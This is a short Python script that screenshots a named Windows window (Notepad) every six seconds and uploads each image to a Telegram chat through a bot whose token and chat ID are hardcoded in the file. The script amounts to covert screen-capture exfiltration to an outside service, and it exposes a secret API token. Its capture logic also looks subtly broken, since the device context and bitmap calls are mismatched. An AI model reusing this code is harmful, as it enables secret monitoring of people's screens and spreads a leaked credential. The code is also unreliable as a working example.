import time
import win32gui
import win32con
import win32ui
from PIL import Image
from io import BytesIO
from telegram import Bot
from telegram import InputFile


# Telegram Bot API Token
telegram_token = '6698371295:AAHRoiRgSYAHuskSVVrJBSw5DeV0jj8aHzQ'

# Telegram Chat ID (replace with your chat ID)
telegram_chat_id = '6020027159'

# Window title of the application you want to capture
window_title = '*Untitled - Notepad'

# Interval between screenshots (in seconds)
interval_seconds = 6  # 6 seconds for testing, you can change it back to 600 for 10 minutes

# Initialize the Telegram Bot
bot = Bot(token=telegram_token)

def get_window_screenshot(title):
    try:
        hwnd = win32gui.FindWindow(None, title)
        if hwnd != 0:
            # Get the window's position and size
            left, top, right, bottom = win32gui.GetWindowRect(hwnd)

            # Create a device context (DC) for the window
            window_dc = win32gui.GetWindowDC(hwnd)

            # Create a compatible DC
            compatible_dc = win32ui.CreateDC()
            compatible_dc.CreateCompatibleDC()

            # Create a bitmap compatible with the compatible DC
            bmp = win32ui.CreateBitmap()
            bmp.CreateCompatibleBitmap(compatible_dc, right - left, bottom - top)

            # Select the bitmap into the compatible DC
            compatible_dc.SelectObject(bmp)

            # BitBlt the content of the window into the compatible DC
            win32gui.PrintWindow(hwnd, compatible_dc.GetHandle(), 0)

            # Create a PIL image from the compatible DC
            image = Image.frombuffer(
                'RGB',
                (right - left, bottom - top),
                compatible_dc.GetBitmapBits(True),
                'raw',
                'BGRX',
                0,
                1
            )

            img_byte_array = BytesIO()
            image.save(img_byte_array, format="PNG")
            img_byte_array.seek(0)
            return img_byte_array
        else:
            print(f"Window with title '{title}' not found.")
            return None
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None

def send_screenshot_to_telegram(chat_id, image):
    try:
        if image:
            bot.send_photo(chat_id=chat_id, photo=InputFile(image, filename="screenshot.png"))
    except Exception as e:
        print(f"Error sending screenshot to Telegram: {e}")

if __name__ == "__main__":
    while True:
        screenshot = get_window_screenshot(window_title)
        send_screenshot_to_telegram(telegram_chat_id, screenshot)
        time.sleep(interval_seconds)
